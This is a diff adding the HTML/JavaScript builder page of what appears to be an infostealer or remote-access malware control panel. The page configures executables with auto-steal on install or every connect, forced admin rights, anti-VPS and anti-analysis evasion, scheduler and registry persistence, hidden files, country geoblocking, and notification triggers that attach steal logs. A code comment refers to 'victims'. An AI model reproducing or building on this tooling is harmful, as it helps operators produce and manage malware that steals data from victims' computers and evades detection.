@@ -1,0 +1,826 @@
+<script src="pages/jszip.min.js"></script>
+<script src="pages/builder.js"></script>
+<div class="headinfo">
+</div>
+<script>
+
+</script>
+<div id="backblur"
+    onclick="closebuildconfigsmenu();closedelitebuild(); $('.mainpopup').hide(); $('.confirmpopup').hide();">
+</div>
+
+
+<div class="buildheader">
+    <div class="headselectorbutton headselectorbuttonactive" onclick="headsel('.pagemanager',this);"><b>
+            <i18n>builder.tab_builds</i18n>
+        </b>
+
+    </div>
+    <div class="headselectorbutton" onclick="headsel('.pagescripts',this);"><b>
+            <i18n>builder.tab_scripts</i18n>
+        </b></div>
+
+    <script>
+        function headsel(el, t) {
+            $(".pagemanager").eq(0).hide();
+            $(".pagescripts").eq(0).hide();
+            $(el).eq(0).show();
+            $(".headselectorbutton").eq(0).removeClass("headselectorbuttonactive");
+            $(".headselectorbutton").eq(1).removeClass("headselectorbuttonactive");
+            $(t).addClass("headselectorbuttonactive");
+
+        }
+    </script>
+
+
+
+    <div id="buildmanagermenu">
+    </div>
+    <script>
+        function showbuildconfigsmenu() {
+            $("#backblur").show();
+            $("#buildconfigsmenu").show();
+        }
+        function closebuildconfigsmenu() {
+            $("#backblur").hide();
+            $("#buildconfigsmenu").hide();
+        }
+    </script>
+
+
+</div>
+
+
+
+<div class="pagemanager" style="height: 100%;">
+
+    <div id="delitebuild">
+        <img onclick="closedelitebuild()" type="image/svg+xml" src="image/square-xmark.svg" width="27" height="27"
+            class="closebutton">
+        <pre>
+    <b><i18n>builder.del_build_title</i18n></b>
+
+    <i18n>builder.del_build_sub</i18n>
+    <br>
+    <i18n>builder.are_you_sure</i18n>
+    </pre>
+        <div style="display:flex; margin-left:30%; margin-top:10px;">
+            <div class="button1" style="color:red;"><b>
+                    <i18n>common.yes</i18n>
+                </b></div>
+            <div class="button1" style="color:green;" onclick="closedelitebuild()"><b>
+                    <i18n>common.no</i18n>
+                </b></div>
+        </div>
+    </div>
+    <div id="setbuild">
+
+    </div>
+    <div class="mainpopup" style="height: fit-content; padding-bottom: 10px;" id="buildinfo">
+        <div class="pophead">
+            <div class="popname">
+                <b>
+                    <i18n>builder.build_info</i18n>
+                </b>
+            </div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide();$('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div class="">
+            <center>
+                <table style="margin-top: 10px">
+                    <thead>
+
+                    </thead>
+                    <tbody class="tablebox2">
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_id</i18n>
+                            </td>
+                            <td id="buildinfohwid"></td>
+                            <td>
+                                <i18n>builder.lbl_user_count</i18n>
+                            </td>
+                            <td id="buildinfousercount"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_name</i18n>
+                            </td>
+                            <td id="buildinfoname"></td>
+                            <td>
+                                <i18n>builder.lbl_mutex</i18n>
+                            </td>
+                            <td id="buildinfomutex"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_version</i18n>
+                            </td>
+                            <td id="buildinfoversion">
+                            <td>
+                                <i18n>builder.lbl_install</i18n>
+                            </td>
+                            <td id="buildinfoinstall"></td>
+                            </td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_comment</i18n>
+                            </td>
+                            <td id="buildinfocomment"></td>
+                            <td>
+                                <i18n>builder.lbl_copy_count</i18n>
+                            </td>
+                            <td id="buildinfoinstallcount"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_color</i18n>
+                            </td>
+                            <td id="buildinfocolor"></td>
+                            <td>
+                                <i18n>builder.lbl_autorun</i18n>
+                            </td>
+                            <td id="buildinfoautorun"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_created</i18n>
+                            </td>
+                            <td id="buildinfocreated"></td>
+                            <td>
+                                <i18n>builder.lbl_autosteal</i18n>
+                            </td>
+                            <td id="buildinfoautosteal"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_force_adm</i18n>
+                            </td>
+                            <td id="buildforceadmin"></td>
+                            <td>
+                                <i18n>builder.lbl_anti_mitm</i18n>
+                            </td>
+                            <td id="buildforceantimitm"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>
+                                <i18n>builder.lbl_anti_vps</i18n>
+                            </td>
+                            <td id="buildinfoantivps" class="">
+                                <select class="selector" id="antivpsinfo" onchange="changeantivps()" style="">
+                                    <option>
+                                        <i18n>settings.enabled</i18n>
+                                    </option>
+                                    <option>
+                                        <i18n>settings.disabled</i18n>
+                                    </option>
+                                </select>
+                            </td>
+                            <td>
+                                <i18n>builder.lbl_geoblock</i18n>
+                            </td>
+                            <td style="display: ruby;">
+                                <div id="buildgeobinfo">
+                                    <i18n>settings.disabled</i18n>
+                                </div>
+                                <div class="button1" style="width: 30px; height: 10px;" onclick="opengeoblock()">
+                                    <i18n>builder.btn_edit</i18n>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </center>
+        </div>
+    </div>
+
+    <div class="mainpopup" id="bilderscriptspopup" style="display:none; padding: 2px;">
+        <div class="pophead">
+            <div class="popname">
+                <b>
+                    <i18n>builder.scripts_title</i18n>
+                </b>
+            </div>
+            <div class="popname" style="cursor: pointer;"
+                onclick="window.location.href='/panel/#scripts'; location.reload();"></div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide();$('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+
+        </div>
+        <div id="builderscripts">
+
+        </div>
+    </div>
+
+    <div class="mainpopup" id="readybuildpopup" style="display:none; padding: 2px;">
+        <div class="pophead">
+            <div class="popname">
+                <b>
+                    <i18n>builder.build_ready</i18n>
+                </b>
+            </div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide();$('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+
+        </div>
+        <div id="" style="margin: 15% 0; text-align: center;">
+            <h2>
+                <i18n>builder.build_saved</i18n><br><br>
+                <i18n>builder.archive_password</i18n><br><br>
+                <div style="display: ruby; width: ;"><b>
+                        <div id="pasarch" style="display:inline-block">
+                            <i18n>builder.no_info</i18n>
+                        </div>
+                    </b>
+                    <div class="" style="margin-left:10px;padding:4px 6px;vertical-align:middle;" onclick="copytext()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
+                            fill="currentColor" style="vertical-align:middle">
+                            <path
+                                d="M16 1H4c-1.1 0-2 .9-2 2v12h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z" />
+                        </svg>
+                    </div>
+                </div>
+            </h2><br><br></svg></svg>
+            <center>
+                <div onclick="$('.mainpopup').hide();$('#backblur').hide();" class="button1">
+                    <i18n>common.confirm</i18n>
+                </div>
+            </center>
+        </div>
+    </div>
+
+    <div class="mainpopup" id="geoblockpopup" style="display:none; padding: 2px;">
+        <div class="pophead">
+            <div class="popname">
+                <b>
+                    <i18n>builder.blocked_geo</i18n>
+                </b>
+            </div><svg class="closebutton" onclick="$('#geoblockpopup').hide();" xmlns="http://www.w3.org/2000/svg"
+                width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div>
+            <textarea id="tageoblock"
+                style="background: black; margin-top: 10px; color: azure; height:70%; resize: none; width:99%"
+                placeholder="RU,US,UA"></textarea>
+            <div style="text-align: center; margin: 10px;">
+                <h3>
+                    <i18n>builder.geo_hint</i18n> <a href="https://www.iban.com/country-codes" target="_blank"
+                        style="color: azure;">
+                        <i18n>builder.geo_link</i18n>
+                    </a>.
+                </h3>
+            </div>
+            <div style="display: flex; justify-content: space-around;">
+                <div class="button1" onclick="$('#geoblockpopup').hide();">
+                    <i18n>builder.btn_back</i18n>
+                </div>
+                <div class="button1" onclick="changegeoblock()">
+                    <i18n>builder.btn_save</i18n>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="mainpopup" id="geoblockpopup2" style="display:none; padding: 2px;">
+        <div class="pophead">
+            <div class="popname">
+                <b>
+                    <i18n>builder.blocked_geo</i18n>
+                </b>
+            </div><svg class="closebutton" onclick="$('#geoblockpopup2').hide(); $('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div>
+            <textarea id="tageoblock2"
+                style="background: black; margin-top: 10px; color: azure; height:70%; resize: none; width:99%"
+                placeholder="RU,US,UA"></textarea>
+            <div style="text-align: center; margin: 10px;">
+                <h3>
+                    <i18n>builder.geo_hint</i18n> <a href="https://www.iban.com/country-codes" target="_blank"
+                        style="color: azure;">
+                        <i18n>builder.geo_link</i18n>
+                    </a>.
+                </h3>
+            </div>
+            <div style="display: flex; justify-content: space-around;">
+                <div class="button1" onclick="$('#geoblockpopup2').hide(); $('#backblur').hide();">
+                    <i18n>builder.btn_back</i18n>
+                </div>
+                <div class="button1"
+                    onclick="window.geoblockdata = $('#tageoblock2').val(); $('#geoblockpopup2').hide(); $('#backblur').hide();">
+                    <i18n>builder.btn_save</i18n>
+                </div>
+            </div>
+        </div>
+    </div>
+
+        <div class="bilderblock" id="bilderblock">
+        <div class="buildcreatebut" id="buildcreatebut" onclick="showbuilderwindow();">
+            <p>
+                <i18n>builder.create_new_build</i18n>
+            </p>
+        </div>
+        <div class="buildcreatebut" id="buildslosebut" style="display:none;" onclick="closebuilderwindow();">
+            <p>
+                <i18n>builder.close_builder</i18n>
+            </p>
+        </div>
+        <div class="buildercontent" style="display:none;">
+            <div class="builderblock">
+                <table class="tablebox2"
+                    style="max-width: 100%; width: 100%; padding-bottom: 0px; background: none !important; box-shadow: none !important;">
+                    <thead></thead>
+                    <tbody>
+                        <tr class="tableel2">
+                            <td>
+                                <i18n>builder.lbl_name</i18n>
+                            </td>
+                            <td>
+                                <input id="Buildname" type="text" value=""
+                                    i18n-attr="placeholder:builder.placeholder_name">
+                            </td>
+                        </tr>
+                        <tr class="tableel2">
+                            <td>
+                                <i18n>builder.lbl_mutex</i18n>
+                            </td>
+                            <td>
+                                <input id="Buildmutex" type="text" value="WEBR_R4R45YT45NJI6JN"
+                                    i18n-attr="placeholder:builder.placeholder_mutex">
+                            </td>
+                        </tr>
+
+                        <tr class="tableel2">
+                            <td>
+                                <i18n>builder.lbl_comment</i18n>
+                            </td>
+                            <td>
+                                <input id="Buildtag" type="text" value=""
+                                    i18n-attr="placeholder:builder.placeholder_comment">
+                            </td>
+                        </tr>
+                        <!-- <td>Pump file (MB)</td>
+                            <td>
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input type="number" id="Buildpump" min="0" value="0"> <button
+                                            class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td> -->
+                        <tr class="tableel2" style="display:none">
+                            <td style="width: fit-content;">Start delay(S)</td>
+                            <td>
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input id="Builddelay" type="number" min="0" value="0"> <button
+                                            class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" style="">
+                            <td>
+                                <i18n>builder.lbl_anti_vps</i18n>
+                            </td>
+                            <td>
+                                <div style="margin-left: 20px;">
+                                    <input class="checkbox" id="Buildantivps" type="checkbox">
+                                </div>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="randomType" style="">
+                            <td name="extension">
+                                <i18n>builder.lbl_extension</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="Buildexten" onchange="" style="">
+                                    <option target=".exe">
+                                        webbuild.exe
+                                    </option>
+                                    <!-- <option target=".com">
+                                        webbuild.com
+                                    </option>
+                                    <option target=".bat">
+                                        webbuild.bat
+                                    </option>
+                                    <option target=".cmd">
+                                        webbuild.cmd
+                                    </option>
+                                    <option target=".pif">
+                                        webbuild.pif
+                                    </option>
+                                    <option target=".scr">
+                                        webbuild.scr
+                                    </option> 
+                                    <option>
+                                        webbuild.dll
+                                    </option> -->
+                                </select>
+                            </td>
+
+                        </tr>
+
+                        <tr class="tableel2" id="">
+                            <td>
+                                <i18n>builder.lbl_stub</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="">
+                                    <option id="buildver">
+
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+
+
+
+                        <tr class="tableel2" style="display:none;">
+
+                            <td name="Antianal">
+                                <i18n>builder.lbl_anti_analysis</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="antianal" onchange="autowarning();" style="">
+                                    <option data-value="None">
+                                        <i18n>builder.opt_none</i18n>
+                                    </option>
+                                    <option data-value="Anti Mitm">
+                                        <i18n>builder.opt_anti_mitm</i18n>
+                                    </option>
+                                    <option data-value="Anti VPS">
+                                        <i18n>builder.opt_anti_vps</i18n>
+                                    </option>
+                                    <option data-value="Full">
+                                        <i18n>builder.opt_full</i18n>
+                                    </option>
+                                </select>
+                            </td>
+
+                        </tr>
+                    </tbody>
+                </table>
+                <div id="antianalnotify" style="display: none;">
+                    <center><b style='color: red; font-size: 18px;'>
+                            <i18n>builder.warn_anti_mitm</i18n>
+                        </b></center>
+                </div>
+                <center id="bottomblock" style="margin-top: 20px;">
+                    <a class="builddefault" style=""><b>
+                            <i18n>builder.warn_default</i18n>
+                        </b></a>
+                    <div style="display:flex;">
+                        <div class="button1" style="padding-top: 8px; width: 170px; margin-top: 10px; color: var(--color1) "
+                            onclick=" createbuild()"><b>
+                                <i18n>builder.btn_create</i18n>
+                            </b>
+                        </div>
+                        <div class="button1" style="padding-top: 8px;width: 170px; margin-top: 10px;"
+                            onclick=" builderscriptsshow()">
+                            <i18n>builder.btn_scripts</i18n>
+                        </div>
+                        <div class="button1" style="padding-top: 8px;width: 170px; margin-top: 10px;"
+                            onclick="opengeoblock2();">
+                            <i18n>builder.btn_geoblock</i18n>
+                        </div>
+                    </div>
+                </center>
+            </div>
+            <div class="builderblock">
+                <table class="tablebox2"
+                    style="max-width: 100%; width: 100%; padding-bottom: 0px; background: none !important; box-shadow: none !important;">
+                    <thead></thead>
+                    <tbody>
+                        <tr class="tableel2" id="" style="">
+                            <td style="width: 120px;">
+                                <i18n>builder.lbl_auto_steal</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="BuildautoSteal" onchange="installparmshow()" style="">
+                                    <option data-value="Once">
+                                        <i18n>builder.opt_once</i18n>
+                                    </option>
+                                    <option data-value="None">
+                                        <i18n>builder.opt_none</i18n>
+                                    </option>
+                                    <option data-value="Every connect">
+                                        <i18n>builder.opt_every_connect</i18n>
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2">
+                            <td>
+                                <i18n>builder.lbl_force_admin</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="Buildfadmin" onchange="autowarning();" style="">
+                                    <option data-value="Normal">
+                                        <i18n>builder.opt_normal</i18n>
+                                    </option>
+                                    <option data-value="Agressive">
+                                        <i18n>builder.opt_agressive</i18n>
+                                    </option>
+                                    <option data-value="None">
+                                        <i18n>builder.opt_none</i18n>
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="">
+                            <td>
+                                <i18n>builder.lbl_install</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="Buildinstall"
+                                    onchange="installparmshow(); autowarning(); autoranparmshow();" style="">
+                                    <option data-value="Random">
+                                        <i18n>builder.opt_random</i18n>
+                                    </option>
+                                    <option data-value="None">
+                                        <i18n>builder.opt_none</i18n>
+                                    </option>
+                                    <option data-value="Custom">
+                                        <i18n>builder.opt_custom</i18n>
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="noneType" style="display: none;">
+                            <td colspan="2">
+                                <center><b>
+                                        <i18n>builder.warn_no_autostart</i18n>
+                                    </b></center>
+                            </td>
+                        </tr>
+
+
+
+                        <tr class="tableel2" id="customType" style="display: none;">
+                            <td>
+                                <i18n>builder.lbl_path</i18n>
+                            </td>
+                            <td>
+                                <input type="text" id="buildPath" value="" placeholder="$AppData\build.exe">
+                            </td>
+                        </tr>
+                        <tr class="tableel2 setinstall" id="" style="">
+
+                        </tr>
+                        <tr class="tableel2 setinstall" id="" style="">
+                            <td>
+                                <i18n>builder.lbl_autorun</i18n>
+                            </td>
+                            <td>
+                                <select class="selector" id="Buildautorun" onchange="autoranparmshow(); autowarning();"
+                                    style="">
+                                    <option data-value="Scheduler">
+                                        <i18n>builder.opt_scheduler</i18n>
+                                    </option>
+                                    <option data-value="Scheduler + Registry">
+                                        <i18n>builder.opt_scheduler_registry</i18n>
+                                    </option>
+                                    <option data-value="Registry">
+                                        <i18n>builder.opt_registry</i18n>
+                                    </option>
+                                    <!-- <option>
+                                        Service
+                                    </option> -->
+                                    <option data-value="None">
+                                        <i18n>builder.opt_none</i18n>
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+
+                        <tr class="tableel2" id="copycl" style="">
+                            <td>
+                                <i18n>builder.lbl_copy_count</i18n>
+                            </td>
+                            <td style="padding: 3px;">
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input type="number" disabled id="BuildinstallCount" min="1" max="10" value="2">
+                                        <button class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+
+                        <tr class="tableel2" id="autorankeyType" style="display: none;">
+                            <td>
+                                <i18n>builder.lbl_autorun_key</i18n>
+                            </td>
+                            <td>
+                                <input type="text" id="BuildautorunKey" value=""
+                                    i18n-attr="placeholder:builder.placeholder_autorun_key">
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id='hidefilesbld'>
+                        <td><i18n>builder.lbl_hide_files</i18n></td>
+                        <td><input class="checkbox" id="Buildhidefile" type="checkbox"></td>
+                        </tr>
+                        <tr >
+                            <td colspan="2" id="autowarn"></td>
+                            <td></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div style=" display: flex; justify-content: center; width: 100%" class="bildercontainer">
+            <div style="display:none;" id="bilderprogress" class="bilderprogress">
+
+            </div>
+        </div>
+    </div>
+    <center>
+        <!-- <div id="stubvershow" style="margin-bottom: 10px;" class="overtablebox2">
+            <div style="text-align: center; font-size: 20px; width: 508px;">
+                Current version of the stab: <b id="buildver"></b>
+            </div>
+        </div> -->
+    </center>
+    <div id="builds">
+
+    </div>
+</div>
+
+<div class="pagescripts" style="display:none;">
+    <script src="pages/scripts.js"></script>
+
+
+    <div id="overlay"></div>
+    <div id="editorPopup">
+        <div class="pophead" style="background: #171717;">
+            <div class="popname" id="scriptnamediv" onclick="renamescriptshow();">
+                <b id="scriptname"></b>
+            </div>
+            <div style="display: inline-flex;">
+                <div class="buttoncfg" onclick="savescriptbutton()" style="">
+                    <i18n>builder.btn_save</i18n>
+                </div>
+                <svg class="closebutton" onclick="$('#editorPopup').hide(); $('.backblur').hide();"
+                    xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                    <path
+                        d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                    </path>
+                </svg>
+            </div>
+
+        </div>
+        <div id="container" style="height:100%;"></div>
+        <link rel="stylesheet" data-name="vs/editor/editor.main"
+            href="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.26.1/min/vs/editor/editor.main.min.css">
+        <script> var require = { paths: { 'vs': 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.26.1/min/vs' } }; </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.26.1/min/vs/loader.min.js"></script>
+        <script
+            src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.26.1/min/vs/editor/editor.main.nls.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.26.1/min/vs/editor/editor.main.js"></script>
+
+
+    </div>
+    <div class="backblur" style="display:none;"></div>
+    <div class="pagemanager">
+        <div class="buildcreatebut" id="buildcreatebut" onclick="showaddscript()">
+            <p>
+                <i18n>builder.create_new_script</i18n>
+            </p>
+        </div>
+        <div id="scripts" style="margin-top: 5px;">
+            <div class="overtablebox2" style="margin-bottom: 5px;">
+                <div class="buildchiled">
+                    <div style="text-align: center; margin: 15px; font-size: 18px;">
+                        <b>
+                            <i18n>builder.lbl_script</i18n>
+                        </b>
+                    </div>
+                    <div class="line1"></div>
+                    <div class="linebuildchiled">
+                        <div class="button1" style="width: 50%;" onclick="confirm(delitebuild(`uO38Lel0POB2dkwo`));">
+                            <i18n>builder.btn_delete</i18n>
+                        </div>
+                        <div class="button1" style="width: 50%;">
+                            <i18n>builder.btn_edit</i18n>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="mainpopup" id="newtrig">
+    <div class="pophead">
+        <div class="popname">
+            <b>
+                <i18n>builder.new_notif_trigger</i18n>
+            </b>
+        </div>
+        <svg class="closebutton" onclick="$('.mainpopup').hide(); $('#backblur').hide();"
+            xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+            <path
+                d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+            </path>
+        </svg>
+    </div>
+    <div style="display: flex; height: 85%;">
+        <div style="width: 50%; align-content: center;">
+            <center>
+                <div>
+                    <i18n>builder.lbl_method</i18n>
+                </div>
+                <select class="methsel " id="methodsbuild" onchange="">
+                </select>
+            </center>
+
+            <center>
+                <div style="margin-top: 20px;">
+                    <i18n>builder.lbl_event</i18n>
+                </div>
+                <select onchange="changenamebuildinbuilder()" class="othersel selector" id="notifyeventbuild" style="">
+                    <option>
+                        <i18n>builder.opt_steal</i18n>
+                    </option>
+                    <option>
+                        <i18n>builder.opt_install</i18n>
+                    </option>
+                    <option>
+                        <i18n>builder.opt_connect</i18n>
+                    </option>
+                </select>
+            </center>
+            <center>
+                <div style="display: inline-flex; margin-top: 20px;">
+                    <div><input class="checkbox" id="attachnotify" type="checkbox"></div>
+                    <lable style="margin-top: 7px;" id="notifygalkabuild">
+                        <i18n>builder.attach_log</i18n>
+                    </lable>
+                </div>
+            </center>
+            <center>
+                <div>
+                    <input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="buildhwid" type="text"
+                        value="" i18n-attr="placeholder:builder.placeholder_build_id">
+                </div>
+            </center>
+        </div>
+        <div style="width: 50%">
+            <textarea id="notifybuildtextarea" class="textareatrig"
+                i18n-attr="placeholder:builder.placeholder_select_method"
+                style="background: black; margin-top: 2px; color: azure; height:99%; resize: none; width:99%"></textarea>
+        </div>
+    </div>
+    <div class="bottombutton">
+        <center>
+            <div class="button1" onclick="notifycreate()" style="width: calc(100% - 24px);">
+                <i18n>builder.btn_create_trigger</i18n>
+            </div>
+        </center>
+    </div>
+</div>
+</div>
+<script>
+    // Re-render JS-populated content after i18n dict is ready:
+    //   - getbuilds() rebuilds the builds list with localized "Info/Notification" buttons
+    //     and the per-build confirm2() subject (delete action + "{n} victims unavailable")
+    (function () {
+        function refresh() {
+            try { if (typeof getbuilds === 'function') getbuilds(); } catch (e) { }
+        }
+        document.addEventListener('i18n:ready', refresh);
+        if (window.i18nReady && window.i18nReady.promise) {
+            window.i18nReady.promise.then(refresh);
+        }
+    })();
+</script>
+</div>
